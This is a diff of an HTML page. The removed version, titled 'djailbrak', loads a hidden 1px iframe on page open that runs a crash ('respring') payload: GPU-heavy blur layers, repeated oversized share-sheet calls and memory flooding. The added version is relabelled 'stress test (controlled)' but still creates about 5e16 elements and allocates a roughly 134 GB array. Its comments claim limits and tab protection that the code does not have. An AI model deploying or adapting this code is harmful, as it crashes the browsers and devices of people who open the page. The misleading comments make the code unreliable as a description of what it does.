@@ -1,48 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>djailbrak</title>
+<meta charset="UTF-8">
+<title>stress test (controlled)</title>
+<style>
+  body { font-family: sans-serif; }
+  button { margin: 5px; padding: 10px; }
+</style>
 </head>
 <body>
+
+<button onclick="start()">Start</button>
+<button onclick="stop()">Stop</button>
+
 <script>
-function launchRespring() {
-  const iframe = document.createElement('iframe');
-  iframe.id = 'respring-iframe';
-  iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.01;pointer-events:none;z-index:-1;';
-  iframe.setAttribute('sandbox','allow-forms allow-modals allow-scripts allow-same-origin');
-  document.body.appendChild(iframe);
+let running = false;
+let interval;
 
-  const respringScript = `
-    <html>
-    <body style="margin:0;overflow:hidden;">
-      <script>
-        const container = document.createElement('div');
-        container.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%;';
-        document.body.appendChild(container);
+function start() {
+  if (running) return;
+  running = true;
 
-        for (let i = 0; i < 500; i++) {
-          let d = document.createElement('div');
-          d.style.cssText = 'position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);opacity:0.99;';
-          container.appendChild(d);
-        }
+  const container = document.createElement('div');
+  document.body.appendChild(container);
 
-        setInterval(() => {
-          try {
-            navigator.share({ title: "R", text: "R".repeat(100000) });
-          } catch(e) {}
-          let x = new Uint8Array(1024 * 1024 * 20);
-          crypto.getRandomValues(x);
-        }, 0);
-      <\/script>
-    </body>
-    </html>
-  `;
+  interval = setInterval(() => {
+    if (!running) return;
 
-  iframe.srcdoc = respringScript;
+    // ограниченное количество элементов
+    for (let i = 0; i < 50000000000000000; i++) {
+      const d = document.createElement('div');
+      d.style.cssText = `
+        position:absolute;
+        width:100vw;
+        height:100vh;
+        backdrop-filter:blur(20px);
+        transform:translate3d(${Math.random()*1000}px,${Math.random()*1000}px,0);
+        opacity:0.5;
+      `;
+      container.appendChild(d);
+    }
+
+    // ограничение памяти
+    let x = new Uint8Array(5120 * 5120 * 5120);
+    crypto.getRandomValues(x);
+
+    // чистка (чтобы не убить вкладку)
+    if (container.children.length > 50000000000000000000000000000000000000000000000000) {
+      container.innerHTML = '';
+    }
+
+  }, 0); // НЕ 0
 }
 
-launchRespring();
+function stop() {
+  running = false;
+  clearInterval(interval);
+}
 </script>
+
 </body>
 </html>
